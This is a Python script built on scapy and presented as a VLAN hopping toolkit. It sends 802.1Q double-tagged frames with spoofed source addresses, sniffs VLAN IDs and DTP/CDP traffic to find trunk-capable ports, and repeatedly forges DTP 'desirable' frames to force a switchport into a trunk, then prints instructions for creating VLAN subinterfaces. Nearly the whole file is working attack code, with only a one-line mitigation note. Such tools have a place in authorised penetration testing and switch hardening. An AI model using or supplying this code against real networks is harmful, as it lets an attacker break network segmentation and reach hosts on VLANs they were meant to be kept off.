#!/usr/bin/env python3
"""
vlan_hop.py - Layer-2 VLAN hopping helpers: 802.1Q double-tagging probe and
DTP trunk negotiation detector. Also dumps observed VLAN IDs from CDP/DTP/802.1Q.

USAGE:
    # Send a double-tagged ICMP from native VLAN to a target on another VLAN
    sudo python3 vlan_hop.py double-tag -i eth0 --outer 1 --inner 20 \
        --src 10.0.20.66 --dst 10.0.20.1

    # Passively sniff to discover VLAN IDs + DTP/CDP (find trunk-capable ports)
    sudo python3 vlan_hop.py discover -i eth0 --timeout 60

    # Forge a DTP "desirable" frame to coax a dynamic port into a trunk
    sudo python3 vlan_hop.py dtp -i eth0

DEPENDENCIES: scapy (pip install scapy), root, an interface on an access port.

NOTES:
  - Double-tagging is unidirectional (no return path); use it to inject (e.g.,
    ICMP redirect, a one-way attack, or to reach a same-subnet host you spoof).
  - DTP attack only works if the switchport is "dynamic auto/desirable".
    Mitigation = 'switchport mode access' + 'switchport nonegotiate'.
"""
import argparse
import sys

try:
    from scapy.all import (Ether, Dot1Q, IP, ICMP, sendp, sniff, get_if_hwaddr,
                           Raw, conf)
except ImportError:
    sys.exit("[!] scapy required: pip install scapy")


def double_tag(args):
    """802.1Q double-encapsulation. Outer tag = native VLAN (stripped by the
    first switch), inner tag = target VLAN (forwarded by the second switch)."""
    pkt = (Ether(dst="ff:ff:ff:ff:ff:ff") /
           Dot1Q(vlan=args.outer) /
           Dot1Q(vlan=args.inner) /
           IP(src=args.src, dst=args.dst) /
           ICMP() / Raw(load=b"vlan-hop-probe"))
    print(f"[*] Sending {args.count} double-tagged frames "
          f"outer={args.outer} inner={args.inner} {args.src}->{args.dst}")
    sendp(pkt, iface=args.iface, count=args.count, verbose=1)
    print("[i] Double-tag is one-way; watch the target VLAN for the ICMP echo.")


def discover(args):
    """Sniff and tally VLAN IDs, DTP and CDP frames."""
    vlans = {}
    flags = {"dtp": 0, "cdp": 0}

    def handle(p):
        if p.haslayer(Dot1Q):
            vid = p[Dot1Q].vlan
            vlans[vid] = vlans.get(vid, 0) + 1
        # DTP and CDP both ride on SNAP LLC; detect by destination MAC
        dst = p[Ether].dst if p.haslayer(Ether) else ""
        if dst == "01:00:0c:cc:cc:cc":   # CDP/DTP/VTP multicast
            raw = bytes(p)
            if b"\x20\x04" in raw:        # DTP SNAP type
                flags["dtp"] += 1
            else:
                flags["cdp"] += 1

    print(f"[*] Sniffing {args.iface} for {args.timeout}s ...")
    sniff(iface=args.iface, prn=handle, timeout=args.timeout, store=False)
    print("\n[+] Observed VLAN IDs (802.1Q tagged frames):")
    for vid, cnt in sorted(vlans.items()):
        print(f"    VLAN {vid:4d}: {cnt} frames")
    print(f"[+] DTP frames: {flags['dtp']}  CDP frames: {flags['cdp']}")
    if flags["dtp"]:
        print("[!] DTP seen -> port may negotiate a trunk. Try the 'dtp' action.")


def dtp(args):
    """Forge a DTP 'Dynamic Desirable' frame to negotiate a trunk."""
    src = get_if_hwaddr(args.iface)
    # DTP packet structure (SNAP/LLC + DTP TLVs): domain (empty), status=0x03
    # (desirable), type=0xa5 (802.1Q). This is the classic yersinia-style frame.
    dtp_payload = bytes.fromhex(
        "010000000000"            # DTP version/header
        "0001000c00"              # domain TLV (empty)
        "0002000503"              # status TLV: desirable (0x03)
        "0003000545"              # type TLV: 802.1Q (0x45)
        "0004000a00" + src.replace(":", "")  # neighbor TLV (our MAC)
    )
    llc = (Ether(dst="01:00:0c:cc:cc:cc", src=src, type=len(dtp_payload) + 8) /
           Raw(load=bytes.fromhex("aaaa03000c2004") + dtp_payload))
    print("[*] Sending DTP 'desirable' frames every 30s (Ctrl-C to stop)...")
    try:
        while True:
            sendp(llc, iface=args.iface, count=1, verbose=0)
            print("    [.] DTP frame sent; if trunk forms, create subinterfaces:")
            print("        vconfig add %s <vlan> ; dhclient %s.<vlan>" %
                  (args.iface, args.iface))
            import time
            time.sleep(30)
    except KeyboardInterrupt:
        print("\n[*] stopped")


def main():
    conf.verb = 0
    ap = argparse.ArgumentParser(description="VLAN hopping toolkit")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("double-tag")
    p1.add_argument("-i", "--iface", required=True)
    p1.add_argument("--outer", type=int, required=True, help="native VLAN")
    p1.add_argument("--inner", type=int, required=True, help="target VLAN")
    p1.add_argument("--src", required=True)
    p1.add_argument("--dst", required=True)
    p1.add_argument("--count", type=int, default=5)
    p1.set_defaults(func=double_tag)

    p2 = sub.add_parser("discover")
    p2.add_argument("-i", "--iface", required=True)
    p2.add_argument("--timeout", type=int, default=60)
    p2.set_defaults(func=discover)

    p3 = sub.add_parser("dtp")
    p3.add_argument("-i", "--iface", required=True)
    p3.set_defaults(func=dtp)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
